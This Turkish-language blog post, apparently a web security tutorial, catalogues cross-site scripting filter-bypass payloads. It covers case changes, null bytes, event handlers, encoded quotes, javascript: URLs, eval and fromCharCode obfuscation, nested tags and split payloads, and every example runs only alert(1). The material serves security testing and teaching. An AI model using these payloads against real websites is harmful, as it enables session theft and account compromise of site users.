---
title:  "XSS Filtreleme Atlatma Teknikleri"
date:   2020-03-13
layout: post
categories: 
    - web-guvenligi
thumbnail: posts/xss.jpg
author: laccart
---

# XSS Filtreleme Atlatma Teknikleri

**Cross-Site Scripting (XSS), JavaScript ile kodlanan bir web sitedeki javascript kodlarının manipüle edilmesi olarak ifade edilebilir. Genellikle kullanıcıya ait Cookie bilgileri çalma, site içerisinden başka bir siteye yönlendirme gibi işlemler gerçekleştirmek için kullanılır.**

Saldırgan bakış açısı ile bakıldığında sitenin çalıştırmış olduğu javascript kodlarının arasına kod enjekte edilir. Böylece, enjekte edilen kod parçası sitede çalışan javascript kod parçası ile birlikte çalıştırılır. İstemci taraflı çalışan javascript kodları manipüle edilerek kullanıcı oturum bilgileri ve domain hakkında bilgiler elde edilir. Sunucu taraflı çalışan javascript kodlarının manipüle edilmesiyle sayfayı görüntüleyen ziyaretçiler zafiyetin sonucusunu görebilir. Hatta, XSS senaryonusunun kritikleştirilmesiyle shell alınabilir. Shell alma işlemi, saldırganın uzak makine üzerinde oturum alması ve oturum elde ettiği uzak makine üzerinde işlemler yapmasına ortam sağlamaktadır.

XSS filtrelemesi olmayan ve javascript kod parçası çalıştıran bir web siteyi test etmek için;

```javascript
<script>alert(1)</script>
```

payload’ı kullanılabilir. Bazı web sitelerdeki temel XSS filtrelemeleri atlatmak için;

```javascript
<script >alert(1)</script>
```

payload’ın bazı terimleri arasına boşluk bırakarak yapılabilir. Ayrıca temel savunmalı filtrelemeleri atlatmak için;

```javascript
<ScRipT>alert(1)</sCriPt>
```

payload’ı oluşturan bazı karakterler üzerinde büyüklük küçüklük durumu değiştirilebilir. XSS filtrelemelerini atlatmak için payload’ı oluşturan karakterler arasına boş bayt  eklenebilir. Örneğin;

```javascript 
<%00script>alert(1)</script>
```

```javascript
<script>al%00ert(1)</script>
```

payloadları kullanılabilir. Böylece bazı filtreleme yöntemleri atlatılabilir. 

HTML dosyalarının içerisinde yazılan etiketler ve özellikler javascript kodları ile bağlantılı şekilde çalışıyorsa manipüle edilebilir. HTML ile kodlanan bir sayfadaki girdi alanına XSS payload’ı girilirse, girdi alanındaki payload javascript kodu içerisinde çalıştırılarak XSS zafiyetini tetikleyebilir. Örneğin;

```javascript
<input type=”text” name=”input” value=”test”>
```

input etiketinin içerisindeki value değişkenine **test** değerinin atandığı varsayımı olursa;

```javascript
<input type=”text” name=”input” value=”><script>alert(1)</script>
```

HTML kodunun içerisine zararlı payload yerleştirilir. Sayfa çalıştırıldığında belirtilen input alanındaki value parametresine atanan  payload çalışarak XSS zafiyeti tetiklenebilir. HMTL kodlarında; 

```javascript
<rastgeleTag type=”text” name=”input” value:”><script>alert(1)</script>
```

rastgele etiketler kullanılarak XSS filtreleme teknikleri atlatılabilir.

```javascript
<input/type="text" name="input" value="><script>alert(1)</script>

<input&#9type="text" name="input" value="><script>alert(1)</script>

<input&#10type="text" name="input" value="><script>alert(1)</script>

<input&#13type="text" name="input" value="><script>alert(1)</script>

<input/'type="text" name="input" value="><script>alert(1)</script>
```

Yukarıda gösterilen XSS payload etiketlerinde değişiklikler yapılarak XSS filtreleri atlatılabilir. Ayrıca etiketler üzerinde değişiklikler yapılarak da atlatılabilir. Örneğin;

```javascript
<iNpUt type="text" name="input" value="><script>alert(1)</script>
```

HTML kodunda, etiketin harflerini büyük harf ve küçük harf olarak ayarlayarak XSS filtrelemeleri atlatılabilir. **script** etiketlerinin arasına boş bayt eklenildiği gibi diğer etiketler arasına da eklenilebilir. Örneğin;

```javascript
<%00input type="text" name="input" value="><script>alert(1)</script>

<inp%00ut type="text" name="input" value="><script>alert(1)</script>
```

**input** etiketlerinden önce, sonra veya etiket haflerinin arasına boş bayt eklenerek XSS filtreleri atlatılabilir. Etiketler üzerinde yapılan değişiklikler, özellikler ve değerler üzerinde de yapılabilir. Örnek olarak;

```javascript
<input t%00ype="text" name="input" value="><script>alert(1)</script>

<input type="text" name="input" value="><script>a%00lert(1)</script>
```

**type** özelliği ve XSS payload’ı üzerindeki değişiklik gösterilebilir. Farklı teknikler de javascipt kodları manipüle edilerek zararlı payload çalıştırılabilir. Farklı tekniklerden biri ise, **Event Handlers** olarak bilinen Olay İşleyicileri kullanılabilir. HTML dilinde, olay işleyicileri bir öğenin tetiklediği olayları gerçekleştirmektedir. Olay işleyicileri, gerçekleşecek olayları, javascript kodlarıyla gerçekleştirir. Öğelerin tetikleyeceği olaylar, tarayıcı veya bir kullanıcı tarafından başlatılabilir. Bir butona tıklama olayı, sayfayı yükleme olayı veya bir hata fırlatma olayı örnek olarak verilebilir. 

Örnek olarak bir formun doldurulması durumunda;

```javascript
<input onsubmit=alert(1)>
```

**onsubmit** olay işlemcisine XSS payload’ı atanabilir. **onsubmit** olayı gerçekleştirildiğinde enjekte edilen XSS payload’ı çalışabilir. Bazı olay işlemcileri ise kullanıcının etkileşimi olmadan gerçekleştirilebilir. Bunlara örnek olarak;

```javascript
<object onerror=alert(1)>

<body onactivate=alert(1)>

<body onfocusin=alert(1)>

<script onreadystatechange=alert(1)>

<input autofocus onfocus=alert(1)>
```

**onerror, onactivate, onfocusin, onreadystatechange** ve **onfocus** olay işlemcileri verilebilir. HTML5’te ise bazı olay işleyiciler ile ilgili bazı yeni saldırı vektörleri ortaya çıkmaktadır. Örnek olarak;

```javascript
<audio src="new.mp3" onerror=alert(1)>

<video src="new.mp4" onerror=alert(1)>

<svg width="200" height="100" onload=alert(1)>
```

ses, video ve SVG grafiklerini içeren medya öğeleri verilebilir. Açılan etiketlerde olay işleyicilerde payloadlar kullanıldığı gibi kapatılan etiketlerde de kullanılabilir. Örnek olarak;

```javascript
</a onfocus=alert(1)>
```

**a** etiketini kapatan etikete payload eklenmesiyle verilebilir. 

XSS zafiyetini tetiklemek için kullanılan farklı tekniklerden bir diğeri sınırlayıcılar ve parantezler olabilir. Sınırlayıcılar, metin dizelerini birbirinden ayırmak için kullanılan bir veya birden fazla karakter meydana gelebilir. XSS zafiyetinin ararken sınırlayıcıların kullanılması verimli olabilir. HTML’de boşluk, genellikle nitelikleri ve değerleri birbirinden ayırmak için kullanılabilir. Sınırlayıcı olarak tek tırnak veya çift tırnak kullanılarak bazı filtrelemeler atlatılabilir.

```javascript
<img onerror="alert(1)"src=x>

<img onerror='alert(1)'src=x>
```

**onerror** olay işlemcisi kullanımında tek tırnak ve çift tırnak kullanılarak bazı filtrelemeler atlatılabilir. Bazı filtrelemeler tırnakları blacklist’e almaları durumunda ise;

```javascript
<img onerror=&#34alert(1)&#34src=x>

<img onerror=&#39alert(1)&#39src=x>
```

Tırnaklar kodlanmış bir şekilde kullanılabilir. Böylece, tırnakları blacklist’e alan filtrelemeler atlatılabilir. Ayrıca ters tırnakların kullanılması, bazı filtrelemeleri atlatmak için kullanılabilir. Örnek olarak;

```javascript
<img onerror=`alert(1)`src=x>

<img onerror=&#96alert(1)&#96src=x>`
```

verilebilir. Bazı filtreler, **on**  anahtar kelimesini kullanan olay işlemcilerini tespit etmektedir. Fakat, özelliklerin sırası daha önceye getirilirse “on” anahtar kelimesi olduğu halde, **on** ile başlamadığı için filtreleme atlatılabilir. Örneğin;

```javascript
<img src=`x`onerror=alert(1)>
```

olarak gösterilebilir. Sınırlayıcılar gibi, büyük ve küçük işaretleri gibi olan parantezlerde kötüye kullanılabilir. Bundan dolayı bazı filtrelemeler bu parantezlerin kullanımı doğrultusunda silebilir veya blacklist’teki değerler ile eşleştirilebilir. Böylece XSS zafiyetinin tetiklenmesi engellenebilir. Ama bu filtrelemeyi atlatmak için fazladan küçük işareti veya büyük işareti kullanılabilir. Ayrıca yorum satırına çevirme sembolleri de kullanılabilir. Örneğin;

```javascript
<<script>alert(1)//<</script>
```
 
payload, filtrelemeye takılmamak için fazladan küçüktür işareti ve yorum satırına çevirme işareti kullanmaktadır. Böylece filtrelemeden geçtikten sonraki görünümü;

```javascript
<script>alert(1)</script>
```

şeklini alarak javascript kodu içerisinde çalıştırılarak XSS zafiyeti tetiklenebilir. Bazen de bir küçüktür işaretinin olay işlemcisinden sonra kullanılmasında filtrelemeyi atlatabilir. Örneğin;

```javascript
<input onsubmit=alert(1)<
```

şeklinde yapılabilir. Bazı durumlarda, farklı karakterlerin kullanılması payload'ın çalışmasına ortam hazırlayabilir. Küçüktür, büyüktür çift parantezleri kullanılarak filtreleme mekanizması atlatılabilir. Atlatıldıktan sonra javascript bu parantezleri normal parantez olarak algılayıp XSS zafiyeti tetiklenebilir. Örnek olarak;

```javascript
«input onsubmit=alert(1)»

&#174input onsubmit=alert(1)&#175
```

payload'ı verilebilir. Ayrıca, karakterler kodlanarak filtrelemeler atlatılabilir. XSS zafiyeti tetiklemenin bir diğer tekniği ise Pseudo protokollerinin kullanılması olabilir. İstemci taraflı XSS zafiyetlerinde tarayıcılar, JavaScript kodunu bir URL’in veya URL bağlantılı bir özelliğin bir parçası olarak JavaScript kodunun içerisinde çalıştırabilir. Visual Basic tabanlı benzer bir komut dosyası dili olan VBScript, Internet Explorer’ın bazı eski sürümlerinde aynı işlevi görmektedir. Pseudo protokolleri, XSS zafiyetinin tetiklenmesinde payload olarak kullanılabilir. Örneğin **href** özelliği, genellikle köprü görevi görerek bir URL linkinin konumunu belirtmektedir. Örnek olarak;

```javascript
<a href="https://www.google.com">Click Here</a>

<a href="javascript:alert(1)">Click Here</a>
````

**href** özelliğinin bulunduğu HTML kod parçası gösterilir. İkinci gösterimde ise URL adresi yerine XSS zafiyetini tetiklemek için payload enjekte edilir. Benzer şekilde;

```javascript
<img src=javascript:alert(1)>

<form action=javascript:alert(1)>

<object data=javascript:alert(1)>

<button formaction=javascript:alert(1)>

<video src=javascript:alert(1)>
```

**src, action, data, formaction** gibi Pseudo protokolleri üzerinde gösterilmektedir.

XSS filtrelemelerinde, varolan javascript kodu içerisindeki kod dizilimi ile oynayarak zafiyet tetiklenebilir. Örneğin, **//** çift eğik çizgi ile javascript komutlarını yorum satırı haline getirilebilir. Bunla birlikte istenen payload eklenerek zafiyet tetiklenebilir. Örneğin;

```javascript
<script>var a = 'teststring; ... </script>
```

kod parçasında a değişkeninin tek tırnak işareti ile açılıp bir string değerden sonra noktalı virgül ile kapatılmaktadır. 

```javascript
';alert(1);//
```

payload, önceki açılan tek tırnak kodu noktalı virgül ile birlikte kapatmaktadır. Daha sonra zararlı payload eklenerek XSS zafiyeti tetiklenebilir. En sonda da **//** işaretini kullanarak sonraki yazılanları yorum satırına çevrilir. JavaScript, bazen filtreleri atlatmak karakter kaçırma işlemine izin verebilir. Örneğin;

```javascript
<script>var a = '\\'; alert(1); //
```

payload, kod filtrelemenin atlatılmasına ve payload’ın çalıştırılmasına olanak vermektedir. Başka bir yöntem ise, 

```javascript
<script>a\u006cert(1)</script>
```

payload'ı ile filtrelemenin atlatılmasını sağlamak için Unicode karakterler kullanılabilir. 
JavaScript, herhangi bir ifadeyi string olarak değerlendiren eval() adında bir işlev içermektedir. Uygulamalar, **eval()** işlevinin kullanılmasına izin veriyorsa, XSS payload kullanarak, zafiyet tetiklenebilir. Filtreleme işleminden gizlenmek için Unicode kodlama yapılabilir. Örneğin;

```javascript
<script>eval('a\u006cert(1)')</script>
```

**alert(1)** komutunda, **l** harfinin Unicode karşılığı kullanılarak XSS payload’ı oluşturulabilir. Eval() işlevi engellenirse, bazen işlevin gerçek karakterlerini de kodlayarak zafiyet tetiklenebilir. Ayrıca, farklı bir teknik olarak eval() komutu içerisinde dinamik dize işlemi yapılabilir. Örneğin;

```javascript
<script>eval('al' + 'ert(1)')</script>
```

kod parçasında gösterilebilir. Ayrıca eval() komutuna alternatif olarak **FromCharCode()** komutu kullanılabilir. Örneğin;

```javascript
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>
```

payload'daki sayısal değerler karaktere çevrilir. Sonrasında eval() işlevi içerisinde çalıştırılır. Böylece XSS filtrelemesinin atlatılarak zafiyet tetiklenebilir.

Filtrelemeleri atlatmanın yollarından biri karakter kodlamadır. Kullanılan payload’ın tamamını veya bir kısmını kodlayarak filtrelenme teknikleri atlatılabilir. **alert(1)** dizesinin farklı kodlanma şekilleri aşağıda gösterilmektedir.

```nasm
Hexadecimal: 61 6C 65 72 74 28 31 29

Octal: 141 154 145 162 164 050 061 051

Binary:	01100001 01101100 01100101 01110010 01110100 00101000 00110001 00101001

Base64:	YWxlcnQoMSk= 
```

XSS zafiyetinin tetiklenmesini bir başka yolu, meta etiketinin içerisindeki yönlendirme yapılacak dizin veya URL adresinin atanacağı parametrenin manipüle edilmesidir. 

```javascript
<meta http-equiv="refresh" content="0;url=javascript:alert(1);">
```

Ayrıca dosya türlerinin belirtilmesi için kullanılan **src** parametresinin manipüle edilmesi zafiyetin tetiklenmesine neden olabilir.

```javascript
<script src="payload.jpg">
```

XSS saldırılarına karşı filtreleme tekniklerinden biri XSS zafiyetini tetikleyecek payload'ın çalıştırılmadan bir parçasının silinmesidir. Böylece, geriye kalan parça XSS zafiyetini tetikleyememektedir. Örneğin, payload’ı içerisindeki **script** etiketlerinin silinmesi ile XSS zafiyetinin tetiklenmesi engellenebilir. Fakat, bu filtreleme özelliği birden fazla etiket kullanılarak atlatılabilir.

```javascript
<script><script>alert(1)</script>
```

İki tane **script** etiketi kullanılabilir. Birinci etiket filtrelemeden dolayı silindiği takdirde varsayılan payload çalışıp XSS zafiyeti tetiklenebilir.

```javascript
<sc<script>ript>alert(1)</script>
```

Ayrıca, **script** etiketinin içerisinde, aynı etiket yerleştirilebilir. Böylece, yerleştirilen etiket silindiğinde varsayılan payload çalışarak XSS zafiyeti tetiklenebilir.

Bir sayfada aynı anda değer döndüren parametreler kullanılarak XSS zafiyeti tetiklenebilir. Örneğin; 

```javascript
<input type="hidden" name="id" value="72">

<input type="hidden" name="checksum" value="6172">

<input type="hidden" name="status" value="critical">
```

belirtilen 3 parametre için varsayılan payload parçalanıp her bir parçasının bir parametreye atanması ile XSS zafiyeti tetiklenebilir. Örneğin;

```javascript
input type="hidden" name="id" value=""><script>/*">

<input type="hidden" name="checksum" value="*/alert(1)/*">

<input type="hidden" name="status" value="*/</script>">
```

parametrelere atanan payload parçalarının yanında /* ve */ karakterleri kullanılabilir. 

Böylece, /* ile */ arasında karakterler yorum satırına dönmektedir. Aradaki karakterlerin yorum satırına dönmesiyle parçalanmış payload tek bir parça haline gelip XSS zafiyeti tetiklenebilir.

